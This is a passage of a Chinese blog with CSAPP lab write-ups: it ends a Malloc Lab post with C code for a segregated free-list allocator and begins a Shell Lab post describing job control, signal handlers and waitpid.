<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * search - 找到块大小对应的等价类的序号</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">4</span>; i &lt;=<span class="number">22</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(size &lt;= (<span class="number">1</span> &lt;&lt; i))</span><br><span class="line">            <span class="keyword">return</span> i<span class="number">-4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i<span class="number">-4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，头结点位置下标是从 0 开始，所以返回<code>i-4</code>。这里还可以写一个二分查找的形式，但是优化作用不大。</p>
<p>找到头结点后，就涉及到双向链表的插入和删除了，下面编写这两个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  插入块, 将块插到表头</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 块大小 */</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="comment">/* 根据块大小找到头节点位置 */</span></span><br><span class="line">    <span class="type">int</span> num = search(size);</span><br><span class="line">    <span class="comment">/* 空的，直接放 */</span></span><br><span class="line">    <span class="keyword">if</span>(GET_HEAD(num) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        PUT(heap_list + WSIZE * num, bp);</span><br><span class="line">        <span class="comment">/* 前驱 */</span></span><br><span class="line">        PUT(bp, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="comment">/* 后继 */</span></span><br><span class="line">        PUT((<span class="type">unsigned</span> <span class="type">int</span> *)bp + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* bp的后继放第一个节点 */</span></span><br><span class="line">		PUT((<span class="type">unsigned</span> <span class="type">int</span> *)bp + <span class="number">1</span>, GET_HEAD(num));</span><br><span class="line">		<span class="comment">/* 第一个节点的前驱放bp */</span></span><br><span class="line">        PUT(GET_HEAD(num), bp);</span><br><span class="line">        <span class="comment">/* bp的前驱为空 */</span>  	</span><br><span class="line">		PUT(bp, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">/* 头节点放bp */</span></span><br><span class="line">		PUT(heap_list + WSIZE * num, bp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数还是比较容易编写的，主要是要注意以下几点：</p>
<ul>
<li>插入块总是插入到表头</li>
<li>指针问题要细致考虑。比如：<code>heap_list + WSIZE * num</code>是对应大小类头结点在堆中的位置，而<code>GET_HEAD(num)</code>是大小类头结点存放的第一个块的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  删除块,清理指针</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 块大小 */</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="comment">/* 根据块大小找到头节点位置 */</span></span><br><span class="line">    <span class="type">int</span> num = search(size);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 唯一节点,后继为null,前驱为null </span></span><br><span class="line"><span class="comment">     * 头节点设为null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">	<span class="keyword">if</span> (GET_PRE(bp) == <span class="literal">NULL</span> &amp;&amp; GET_SUC(bp) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">		PUT(heap_list + WSIZE * num, <span class="literal">NULL</span>);</span><br><span class="line">	&#125; </span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 最后一个节点 </span></span><br><span class="line"><span class="comment">     * 前驱的后继设为null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (GET_PRE(bp) != <span class="literal">NULL</span> &amp;&amp; GET_SUC(bp) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		PUT(GET_PRE(bp) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125; </span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 第一个结点 </span></span><br><span class="line"><span class="comment">     * 头节点设为bp的后继</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (GET_SUC(bp) != <span class="literal">NULL</span> &amp;&amp; GET_PRE(bp) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		PUT(heap_list + WSIZE * num, GET_SUC(bp));</span><br><span class="line">		PUT(GET_SUC(bp), <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 中间结点 </span></span><br><span class="line"><span class="comment">     * 前驱的后继设为后继</span></span><br><span class="line"><span class="comment">     * 后继的前驱设为前驱</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (GET_SUC(bp) != <span class="literal">NULL</span> &amp;&amp; GET_PRE(bp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		PUT(GET_PRE(bp) + <span class="number">1</span>, GET_SUC(bp));</span><br><span class="line">		PUT(GET_SUC(bp), GET_PRE(bp));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>考虑四种情况就好，注释写得很详细了</li>
<li>同样要注意指针的问题。比如：<code>GET_PRE(bp) + 1</code>是<code>bp</code>指向的块的前驱的后继的<strong>位置</strong>；而<code>GET_PRE(bp+1)</code>是<code>bp</code>指向的块的后继。我在这里因为 segmentation fault 卡了好久。</li>
</ul>
<h2 id="合并与分割-1"><a href="#合并与分割-1" class="headerlink" title="合并与分割"></a>合并与分割</h2><p>合并操作还是与 Implict Free List 一样，是根据空闲块在堆中位置相邻来合并的，与链表排列无关</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 合并空闲块</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));     <span class="comment">/* 前一块大小 */</span></span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));     <span class="comment">/* 后一块大小 */</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));                       <span class="comment">/* 当前块大小 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 四种情况：前后都不空, 前不空后空, 前空后不空, 前后都空</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* 前后都不空 */</span></span><br><span class="line">    <span class="keyword">if</span>(prev_alloc &amp;&amp; next_alloc)&#123;</span><br><span class="line">        insert(bp);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 前不空后空 */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)&#123;</span><br><span class="line">        <span class="comment">/* 将后面的块从其链表中删除 */</span></span><br><span class="line">        delete(NEXT_BLKP(bp));</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));  <span class="comment">//增加当前块大小</span></span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">//先修改头</span></span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));           <span class="comment">//根据头部中的大小来定位尾部</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 前空后不空 */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)&#123;</span><br><span class="line">        <span class="comment">/* 将其前面的快从链表中删除 */</span></span><br><span class="line">        delete(PREV_BLKP(bp));</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));  <span class="comment">//增加当前块大小</span></span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);                     <span class="comment">//注意指针要变</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 都空 */</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">/* 将前后两个块都从其链表中删除 */</span></span><br><span class="line">        delete(NEXT_BLKP(bp));</span><br><span class="line">        delete(PREV_BLKP(bp));</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));  <span class="comment">//增加当前块大小</span></span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 空闲块准备好后,将其插入合适位置 */</span></span><br><span class="line">    insert(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>操作与 Implict Free List 几乎相同</li>
<li>额外的操作就是合并前要将前后的空闲块从它的原链表中删除，合并完成后要将新的空闲块插入对应的空闲链表中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 分离空闲块</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 块已分配，从空闲链表中删除 */</span></span><br><span class="line">    delete(bp);</span><br><span class="line">    <span class="keyword">if</span>((csize - asize) &gt;= <span class="number">2</span>*DSIZE) &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        <span class="comment">/* bp指向空闲块 */</span></span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">        <span class="comment">/* 加入分离出来的空闲块 */</span></span><br><span class="line">        insert(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 设置为填充 */</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>分离空闲块也只是加入了将分离出来的空闲块插入相应空闲链表的操作</li>
</ul>
<h2 id="分配块-1"><a href="#分配块-1" class="headerlink" title="分配块"></a>分配块</h2><p>Segregated Fit 的分配策略就很清晰了：</p>
<ul>
<li>先从对应的大小类的空闲链表中查找</li>
<li>如果找不到，则到下一个更大的大小类查找</li>
<li>如果都找不到，则扩展堆</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 适配</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num = search(asize);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* bp;</span><br><span class="line">    <span class="comment">/* 如果找不到合适的块，那么就搜索下一个更大的大小类 */</span></span><br><span class="line">    <span class="keyword">while</span>(num &lt; CLASS_SIZE) &#123;</span><br><span class="line">        bp = GET_HEAD(num);</span><br><span class="line">        <span class="comment">/* 不为空则寻找 */</span></span><br><span class="line">        <span class="keyword">while</span>(bp) &#123;</span><br><span class="line">            <span class="keyword">if</span>(GET_SIZE(HDRP(bp)) &gt;= asize)&#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="type">void</span> *)bp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* 用后继找下一块 */</span></span><br><span class="line">            bp = GET_SUC(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 找不到则进入下一个大小类 */</span></span><br><span class="line">        num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="测试结果及分数-1"><a href="#测试结果及分数-1" class="headerlink" title="测试结果及分数"></a>测试结果及分数</h2><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220411085545301.png" alt="image-20220411085545301"></p>
<p>这个提升是巨大的！与 Implict Free List 进行对比，发现本方法空间利用率略微降低了，而吞吐量提高了近 50 倍！</p>
<p>完整代码见：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Deconx/CSAPP-Lab/blob/master/solutions/08_Malloc%20Lab/mm.c">https://github.com/Deconx/CSAPP-Lab/blob/master/solutions/08_Malloc%20Lab/mm.c</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>这个实验写得人头皮发麻，欲罢不能。定义一堆宏，指针满天飞，写时一时爽，debug 火葬场。我整个周末几乎都在与 segmentation fault 打交道，随意一个小笔误就要找几个小时，唉。</p>
</li>
<li><p>CSAPP 课本编排的很有意思，Implict Free List 花费了大量篇幅讲解，给出了所有代码，而后面的 Segregated Free Lists 却几乎是一笔带过。现在做完了实验才知道，原来是要把这部分放进实验考察，果然读 CSAPP 一定要做实验，两者是相得益彰的。</p>
</li>
<li><p>犹记得周日晚十一点四十，在被 segmentation fault 折腾的万念俱灰的我又一次编译运行，发现程序跑通时的欣喜若狂，那一刻，仿佛整个世界都是我的，或许，这就是计算机人的浪漫吧。</p>
</li>
<li><p>我的实现还有很多可以优化的地方，比如我没有重新实现<code>realloc</code>函数，空闲块的也可以用更加高效的平衡树来组织。由于学业繁忙，这些等我码力更强时再回来挑战！</p>
</li>
<li><p>本实验耗时 3 天，约 16 小时</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/04/03/CSAPP-Lab07/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/03/CSAPP-Lab07/" class="post-title-link" itemprop="url">CSAPP-Lab07 Shell Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-03 12:28:24" itemprop="dateCreated datePublished" datetime="2022-04-03T12:28:24+08:00">2022-04-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-10 23:57:04" itemprop="dateModified" datetime="2022-06-10T23:57:04+08:00">2022-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>11 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>Shell Lab 要求实现一个带有作业控制的 Unix Shell 程序，需要考虑基础的并发，进程控制以及信号和信号处理。做这个实验之前一定要将 CSAPP 的第八章（异常控制流）仔细研读。</p>
<p>我们需要实现的函数：</p>
<ul>
<li><code>eval</code>：解析命令行 <strong>[约 70 行]</strong></li>
<li><code>builtin_cmd</code>：检测是否为内置命令<code>quit</code>、<code>fg</code>、<code>bg</code>、<code>jobs</code> <strong>[约 25 行]</strong></li>
<li><code>do_bgfg</code>：实现内置命令<code>bg</code>和<code>fg</code> <strong>[约 50 行]</strong></li>
<li><code>waitfg</code>：等待前台作业执行完成 <strong>[约 20 行]</strong></li>
<li><code>sigchld_handler</code>：处理<code>SIGCHLD</code>信号，即子进程停止或者终止 <strong>[约 80 行]</strong></li>
<li><code>sigint_handler</code>：处理<code>SIGINT</code>信号，即来自键盘的中断<code>ctrl-c</code> <strong>[约 15 行]</strong></li>
<li><code>sigtstp_handler</code>：处理<code>SIGTSTP</code>信号，即来自终端的停止信号 <strong>[约 15 行]</strong></li>
</ul>
<p>作者提供的帮助函数及功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Here are helper routines that we&#x27;ve provided for you */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span>;  <span class="comment">//解析命令行参数，如果后台运行则返回 1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigquit_handler</span><span class="params">(<span class="type">int</span> sig)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clearjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *job)</span>;				<span class="comment">//清除job结构体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>;				<span class="comment">//初始化jobs列表</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">maxjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>; 				<span class="comment">//返回jobs列表中jid最大值</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid, <span class="type">int</span> state, <span class="type">char</span> *cmdline)</span>;	<span class="comment">//在jobs列表中添加job</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deletejob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span>; 	<span class="comment">//在jobs列表中删除pid对应的job</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fgpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>;				<span class="comment">//返回前台运行的job的pid</span></span><br><span class="line"><span class="keyword">struct</span> <span class="type">job_t</span> *<span class="title function_">getjobpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span>;	<span class="comment">//返回对应pid的job</span></span><br><span class="line"><span class="keyword">struct</span> <span class="type">job_t</span> *<span class="title function_">getjobjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">int</span> jid)</span>; 	<span class="comment">//返回对应jid的job</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pid2jid</span><span class="params">(<span class="type">pid_t</span> pid)</span>;		<span class="comment">//返回对应pid的job的jid</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">listjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>;	<span class="comment">//打印jobs列表</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">void</span>)</span>;	<span class="comment">//帮助信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unix_error</span><span class="params">(<span class="type">char</span> *msg)</span>;	<span class="comment">//错误信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">app_error</span><span class="params">(<span class="type">char</span> *msg)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> <span class="title function_">handler_t</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">handler_t</span> *<span class="title function_">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span>;</span><br></pre></td></tr></table></figure>

<p>CMU 文档的一些说明与要求：</p>
<ul>
<li><p>Shell 的提示标记符为 “tsh&gt; “</p>
</li>
<li><p>用户键入的命令行应包括命令名称和 0 个或多个参数，所有参数以一个或多个空格分隔。如果 name 是一个内置命令，则 tsh 应该立即处理它并等待下一个命令行。否则，tsh 假定该名称是一个可执行程序的路径，并在在一个初始子进程的上下文中加载并运行</p>
</li>
<li><p>tsh 不需要支持管道（|）或 I&#x2F;O 重定向（&lt; 和 &gt;）</p>
</li>
<li><p>键入 ctrl-c（ctrl-z）应该会发送一个 SIGINT（SIGTSTP）信号给当前的前台作业以及它的子进程。如果没有前台作业，则该信号应该没有任何作用</p>
</li>
<li><p>如果命令行以 ＆ 结束，则 tsh 应该在后台运行该作业。否则，它应该在前台运行</p>
</li>
<li><p>每个作业都可以由一个进程 ID（PID）或一个作业 ID（JID）标识，该 ID 是一个由 tsh 分配的正整数。 JID应该在命令行上以前缀 “％” 表示。例如，“％5” 表示 JID 5，“ 5” 表示 PID 5</p>
</li>
<li><p>tsh 应该支持以下内置命令：</p>
<ul>
<li>quit：终止 tsh 程序。</li>
<li>jobs：列出所有后台作业</li>
<li>bg <job>：向作业其发送 SIGCONT 信号来重新启动 <job>，然后在后台运行</li>
<li>fg  <job>：向作业发送 SIGCONT 信号来重新启动 <job>，然后在前台运行</li>
</ul>
</li>
<li><p>tsh 必须回收所有的僵死进程</p>
</li>
</ul>
<h1 id="实验前"><a href="#实验前" class="headerlink" title="实验前"></a>实验前</h1><p>在正式实验之前，我们还是回顾一下相关知识</p>
<h2 id="回顾：回收子进程"><a href="#回顾：回收子进程" class="headerlink" title="回顾：回收子进程"></a>回顾：回收子进程</h2><p>一个终止了但是还未被回收的进程称为僵死进程。对于一个长时间运行的程序（比如 Shell）来说，内核不会安排<code>init</code>进程去回收僵死进程，而它虽不运行却仍然消耗系统资源，因此实验要求我们回收所有的僵死进程。</p>
<p><code>waitpid</code>是一个非常重要的函数，一个进程可以调用<code>waitpid</code>函数来等待它的子进程终止或停止，从而回收子进程，在本实验大量用到，我们必须学习它的用法：</p>
<p>这个函数用来挂起调用进程的执行，直到<code>pid</code>对应的等待集合的一个子进程的改变才返回，包括三种状态的改变：</p>
<ul>
<li>子进程终止</li>
<li>子进程收到信号停止</li>
<li>子进程收到信号重新执行</li>
</ul>
<p>如果一个子进程在调用之前就已经终止了，那么函数就会立即返回，否则，就会阻塞，直到一个子进程改变状态。</p>
<p>等待集合以及监测那些状态都是用函数的参数确定的，函数定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> *wstatus, <span class="type">int</span> options)</span>;</span><br></pre></td></tr></table></figure>

